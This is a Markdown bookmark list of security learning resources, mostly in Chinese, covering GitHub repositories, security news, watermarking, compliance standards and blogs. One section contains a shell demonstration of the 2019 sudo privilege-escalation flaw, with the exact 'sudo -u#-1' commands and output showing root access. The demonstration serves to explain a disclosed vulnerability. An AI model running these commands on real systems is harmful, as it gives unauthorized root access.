
“玄魂工作室--安全圈” 知识星球内资源汇总 https://github.com/xuanhun/HackingResource

# from Github

python 代码审计项目 https://github.com/MisakiKata/python_code_audit

security_w1k1 https://github.com/euphrat1ca/security_w1k1

应急响应实战笔记，一个安全工程师的自我修养。 https://github.com/Bypass007/Emergency-Response-Notes

C,C++安全指南.md https://github.com/Tencent/secguide/blob/main/C%2CC%2B%2B%E5%AE%89%E5%85%A8%E6%8C%87%E5%8D%97.md

Security PPT https://github.com/FeeiCN/Security-PPT
- > Security-related Slide Presentation（大安全各领域各公司各会议分享的PPT）

# Security News

Linux 基金会联合厂商成立开源安全基金会 https://www.ithome.com/0/501/388.htm
- > OpenSSF 的成员来自核心基础设施联盟 (Core Infrastructure Initiative)、GitHub 开源安全联盟和和其他创始董事会成员，例如 GitHub、Google、IBM、摩根大通、微软、NCC 集团、OWASP 基金会 和 Red Hat。其他创始成员还包括 ElevenPaths, GitLab, HackerOne, Intel, Okta, Purdue, SAFECode, StackHawk, Trail of Bits, Uber 和 VMware。

:couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple:

## 黑客视界
超过500个网站被嵌挖矿脚本 包括微软旗下MSN门户网站
https://www.hackeye.net/threatintelligence/13136.aspx

:couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple:


## 安全牛

2017年网络安全大事记
http://www.aqniu.com/industry/30413.html

最隐蔽且简单易行的水印技术：零宽字符
http://www.aqniu.com/hack-geek/32629.html


:couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple:


## MottoIN

安全相关的免费电子书集合
http://www.mottoin.com/101105.html


:couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple:


## WeChat

SQL和NoSQL注入原理剖析（上） 
https://mp.weixin.qq.com/s/LsqQo_04ROuf2_wLrBRRZQ


:couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple:

## ithome

【[:star:][`*`]】 豆瓣小组内容防搬运新功能，聊聊盲水印那点事 https://www.ithome.com/0/606/114.htm
- > **防不胜防的盲水印**
  * > 这类盲水印是怎样实现的呢？原理并不复杂，**通常是将图片进行离散余弦、小波或者傅里叶变换**，得到图片的频谱信息，再将水印的编码信息叠加到图片的频谱上，然后再进行一次逆变换，**生成的图片就带有几乎无法检测、但又可以确切还原出来的盲水印了**。
  * > 而这样的盲水印制作也非常简单，网络上就有开源算法可以实现，下面以“blind_watermark”为例。
    + > blind_watermark： https://blindwatermark.github.io/blind_watermark/#/zh/
    + > 是一个关于盲水印的开源项目，依赖于 Python 运行。安装了 blind_watermark 后，只需要简单的几行命令，就可以为图片添加文字或者另一张图作为盲水印。
  * > 除了图片可以添加水印，文字也是可以作标记的。下面举个“text_blind_watermark”的例子。
    + > text_blind_watermark（demo）： https://www.guofei.site/pictures_for_blog/app/text_watermark/v1.html
    + > text_blind_watermark 为文字加“盲水印”的原理也很简单，在文字当中穿插特殊的符号（demo 演示的是空格），解码算法识别出特定符号，就可以解出隐藏的信息了。或许 demo 中的空格键肉眼看上去还比较明显，但如果所使用的是更加隐秘的字符呢？字符分布更加稀疏呢？恐怕就非常难以觉察了。

22岁少年破解史上最严重网络攻击，拯救全球互联网，三个月后却被FBI逮捕 https://www.ithome.com/0/488/422.htm
- > 首先，他在隔离的虚拟机中运行了这个程序。然后很快他就注意到其在执行加密时会向一个看起来随机生成的网址发送一条查询信息：
<br> iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com。
<br> 很显然，这个病毒采用了“命令-控制”模式，即某个地方的服务器能给被感染的计算机发送控制指令。Hutchins将这个网址放到浏览器中，却发现根本没有网站。
<br> 因此他访问了域名注册商 Namecheap，在下午 3:08 用 10.69 美元注册了这个地址。Hutchins希望此举能从WannaCry创造者那里夺回部分受害计算机的控制权。或者他至少可通过 sinkholing（沉洞）技术获知受害计算机的数量和位置。
- > 当Hutchins将这个域名定向到 Kryptos Logic 的一组服务器上后，就立马收到了全世界数千台新被感染的计算机的连接。Hutchins在 Twitter 上通报了这一信息，引起了世界各地的研究者、记者和系统管理者的关注。 
<br> 下午 6:30，Hutchins的黑客朋友 Kafeine 分享了一条推文给他。这条让Hutchins感到惊讶的推文来自安全研究者 Darien Huss：“攻击失败，因为该域名已沉洞。” 
<br> 换句话说，由于Hutchins的域名首先上线，因此 WannaCry 感染虽然还会继续，但并不会真正造成任何新的危害。这个蠕虫病毒似乎就这样失去功能了。

:couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple::couple:

## Others

初识身份管理与访问控制IAM - PINGIDM的文章 - 知乎 https://zhuanlan.zhihu.com/p/38385298

Linux下pwn从入门到放弃
https://paper.seebug.org/481/

用户chybeta的安全总结
- https://github.com/CHYbeta/Web-Security-Learning
- https://github.com/CHYbeta/Software-Security-Learning

Burp Suite 实战指南
https://legacy.gitbook.com/book/t0data/burpsuite/details

OpenID 和 OAuth 有什么区别？ - 知乎用户的回答 - 知乎 https://www.zhihu.com/question/19628327/answer/23291315

Linux sudo被曝提权漏洞，任意用户均能以root身份运行命令 https://www.ithome.com/0/450/420.htm
```sh
文中用的命令是 
`sudo -u#-1 id -u` 或 `sudo -u#4294967295 id -u`，
这俩没那么明显。我们来换命令实战下：
----------------------------------------------------------------------------------------------------
// 1.首先以root用户远程登陆一台CentOS 7.6的虚机。
// 2.切换到用户bjweixj，这个其实是IT一个同事的账号，有sudo权限。
[root@temptest ~]# su - bjweixj
Last login: Mon Jul 22 21:51:00 CDT 2019 from 9.186.90.168 on pts/0

// 3.直接分别执行`whoami`和`who am i`，结果符合预期。
[bjweixj@temptest ~]$ whoami
bjweixj
[bjweixj@temptest ~]$ who am i
root     pts/0        2019-10-15 12:26 (9.200.55.20)

// 4.演示这个漏洞的时刻到了。
//（第一个命令whoami本来应该显示当前用户的，对比一下上面，这里变成root了；第二个命令跟这个漏洞没关系，就是一起对比下）
[bjweixj@temptest ~]$ sudo -u#-1 whoami
root
[bjweixj@temptest ~]$ sudo -u#-1 who am i
root     pts/0        2019-10-15 12:26 (9.200.55.20)
// 4.1用文章里的第二个命令也可以生效。
[bjweixj@temptest ~]$ sudo -u#4294967295 whoami
root
[bjweixj@temptest ~]$ sudo -u#4294967295 who am i
root     pts/0        2019-10-15 12:26 (9.200.55.20)

// 5.但是如果用户本身没有sudo权限，这个漏洞也无法利用。
[test1@temptest root]$ sudo -u#-1 whoami

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for test1: 
test1 is not in the sudoers file.  This incident will be reported.
```

## learned from work

AppSec Fundamentals - Industry History
- Responsible disclosure https://en.wikipedia.org/wiki/Responsible_disclosure
- OWASP https://en.wikipedia.org/wiki/OWASP
  * OWASP Top Ten
  * OWASP Application Security Verification Standard (ASVS)
  * ESAPI (The OWASP Enterprise Security API) https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API
- MITRE https://en.wikipedia.org/wiki/Mitre_Corporation
  * Common Vulnerabilities and Exposures (CVE) https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures
- SANS Institute https://en.wikipedia.org/wiki/SANS_Institute  
  * CWE/SANS Top 25

### CCPA (California Consumer Privacy Act)

California Consumer Privacy Act https://en.wikipedia.org/wiki/California_Consumer_Privacy_Act

Four differences between the GDPR and the CCPA https://www.helpnetsecurity.com/2019/02/04/gdpr-ccpa-differences/

CCPA vs. GDPR - differences and similarities https://dataprivacymanager.net/ccpa-vs-gdpr/

### NIST and FIPS 140-2

7 Key Differences Between NIST and ISO Certification https://www.inspec-inc.com/home/company/blog/inspec-insights/2018/08/27/7-key-differences-between-nist-and-iso-certification
> a NIST certification means that a product has been tested against NIST’s Standard Reference Materials (SRMs) and meets the organization’s exact specifications.

COMPUTER SECURITY RESOURCE CENTER - Projects https://csrc.nist.gov/Projects

Cryptographic Module Validation Program (CMVP) https://csrc.nist.gov/Projects/cryptographic-module-validation-program
- Derived Test Requirements (DTR) https://csrc.nist.gov/CSRC/media/Projects/Cryptographic-Module-Validation-Program/documents/fips140-2/FIPS1402DTR.pdf
- Implementation Guidance (IG) https://csrc.nist.gov/CSRC/media/Projects/Cryptographic-Module-Validation-Program/documents/fips140-2/FIPS1402IG.pdf

Cryptographic Algorithm Validation Program (CAVP) https://csrc.nist.gov/projects/cryptographic-algorithm-validation-program

***FIPS 140-2***：
- FIPS 140-2 https://en.wikipedia.org/wiki/FIPS_140-2
- FIPS 140-2 https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.140-2.pdf
- https://csrc.nist.gov/projects/cryptographic-module-validation-program/standards
- https://csrc.nist.gov/publications/detail/fips/140/2/final

FIPS 认证 https://www.kingston.com/cn/usb/encrypted_security/fips
> 联邦信息处理标准 (FIPS) 是美国政府适用于信息技术和计算机安全的标准。FIPS 项目由国家标准与技术研究所 (NIST) 执行。 NIST FIPS 140 是美国联邦政府规定的加密标准项目，用于保护敏感数据。民用和军事领域的美国联邦机构使用的所有采用加密技术的产品都必须符合 FIPS 140。目前的 FIPS 版本为 140-2。
>
> 获取 FIPS 140 验证需要由经过认可的测试实验室进行严格的测试。 结果随后由发放 FIPS 140 验证证书的国家标准与技术研究所 (NIST) 进行审核。

***from Corsec***: 
- https://www.corsec.com/fips-140-2/
- https://www.corsec.com/resources/

An Introduction To FIPS-140-2 Requirements https://blog.ipswitch.com/an-introduction-to-fips-140-2-requirements

### HIPAA

Health Insurance Portability and Accountability Act https://en.wikipedia.org/wiki/Health_Insurance_Portability_and_Accountability_Act


## CIS Benchmarks

Center for Internet Security https://en.wikipedia.org/wiki/Center_for_Internet_Security

CIS Benchmarks https://www.cisecurity.org/cis-benchmarks/
- CIS Benchmarks™ FAQ https://www.cisecurity.org/cis-benchmarks/cis-benchmarks-faq/

6 Essential Things to Know about CIS Benchmarks https://www.advancedcyber.co.uk/it-security-blog/six-essential-things-to-know-cis-benchmark

# Security blogs

Digging passwords in Linux swap http://blog.sevagas.com/?Digging-passwords-in-Linux-swap
> 原因是：![](http://blog.sevagas.com/IMG/arton64.jpg?1500535191)

